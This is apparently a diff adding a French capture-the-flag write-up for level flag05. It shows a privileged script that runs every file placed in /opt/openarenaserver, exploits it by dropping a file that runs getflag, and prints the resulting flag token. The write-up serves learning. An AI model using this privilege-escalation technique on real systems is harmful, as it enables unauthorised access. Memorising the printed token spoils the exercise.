@@ -1,0 +1,56 @@
+# Exploitation du niveau flag05
+
+## 1. Trouver l'exécutable openarenaserver
+
+Tout d'abord, nous utilisons la commande find pour rechercher les fichiers appartenant à l'utilisateur flag05. Nous trouvons deux occurrences de l'exécutable openarenaserver :
+
+```sh
+find / -user flag05 2>&1 | grep -v "Permission"
+[...]
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+```
+
+## 2. Analyser le script openarenaserver
+
+Nous affichons le contenu de l'exécutable openarenaserver en utilisant la commande cat :
+
+cat /usr/sbin/openarenaserver
+
+Le script contient le code suivant :
+
+```sh
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+    (ulimit -t 5; bash -x "$i")
+    rm -f "$i"
+done
+```
+
+Explication du script :
+
+Le script exécute un bash pour chaque fichier dans le répertoire /opt/openarenaserver/ en utilisant ulimit -t 5 pour limiter le temps d'exécution à 5 secondes.
+    Après l'exécution, le fichier est supprimé grâce à la commande rm -f "$i".
+    Le script permet donc d'exécuter des scripts présents dans ce répertoire en tant qu'utilisateur flag05, et après exécution, les fichiers sont effacés.
+
+## 3. Exploiter le script pour exécuter des commandes arbitraires
+
+Le but est d'utiliser cette fonctionnalité pour exécuter une commande arbitraire, comme getflag, en créant un fichier exécutable dans le répertoire /opt/openarenaserver/.
+
+Nous créons un fichier appelé test dans /opt/openarenaserver/ avec une commande qui exécute getflag et redirige la sortie vers un fichier temporaire :
+
+```sh
+echo "getflag > /tmp/result" > /opt/openarenaserver/test
+```
+
+## 4. Exécution du script et récupération du flag
+
+Le script openarenaserver s'exécutera sur le fichier test, exécutant la commande getflag > /tmp/result. Après l'exécution, le fichier /tmp/result contiendra le flag.
+
+Nous affichons ensuite le contenu de ce fichier :
+
+```sh
+cat /tmp/result
+Check flag. Here is your token: viuaaale9huek52boumoomioc
+```
